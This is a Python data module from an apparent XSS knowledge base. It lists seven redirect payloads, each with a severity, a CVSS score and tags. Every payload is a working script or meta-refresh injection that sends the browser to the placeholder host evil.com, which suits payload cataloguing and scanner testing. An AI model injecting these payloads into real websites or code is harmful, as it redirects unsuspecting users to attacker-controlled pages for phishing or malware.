#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26 UTC
Status: Refactored
Telegram: https://t.me/EasyProTech

Redirect Attack Payloads
"""

from ..models import PayloadEntry


REDIRECT_PAYLOADS = {
    "redir_1": PayloadEntry(
        payload="<script>location='//evil.com'</script>",
        contexts=["html_content", "javascript"],
        severity="high",
        cvss_score=7.5,
        description="Simple redirect",
        tags=["redirect", "location"],
        reliability="high",
    ),
    "redir_2": PayloadEntry(
        payload="<script>location.href='//evil.com'</script>",
        contexts=["html_content", "javascript"],
        severity="high",
        cvss_score=7.5,
        description="location.href redirect",
        tags=["redirect", "href"],
        reliability="high",
    ),
    "redir_3": PayloadEntry(
        payload="<script>location.replace('//evil.com')</script>",
        contexts=["html_content", "javascript"],
        severity="high",
        cvss_score=7.5,
        description="location.replace redirect (no history)",
        tags=["redirect", "replace"],
        reliability="high",
    ),
    "redir_4": PayloadEntry(
        payload="<script>location.assign('//evil.com')</script>",
        contexts=["html_content", "javascript"],
        severity="high",
        cvss_score=7.5,
        description="location.assign redirect",
        tags=["redirect", "assign"],
        reliability="high",
    ),
    "redir_5": PayloadEntry(
        payload="<script>window.open('//evil.com')</script>",
        contexts=["html_content", "javascript"],
        severity="high",
        cvss_score=7.0,
        description="Open new window",
        tags=["redirect", "window", "open"],
        reliability="high",
    ),
    "redir_6": PayloadEntry(
        payload="<meta http-equiv=refresh content='0;url=//evil.com'>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Meta refresh redirect",
        tags=["redirect", "meta", "refresh"],
        reliability="high",
    ),
    "redir_7": PayloadEntry(
        payload="<script>top.location='//evil.com'</script>",
        contexts=["html_content", "javascript"],
        severity="high",
        cvss_score=7.5,
        description="Frame breakout redirect",
        tags=["redirect", "top", "frame"],
        reliability="high",
    ),
}

REDIRECT_PAYLOADS_TOTAL = len(REDIRECT_PAYLOADS)
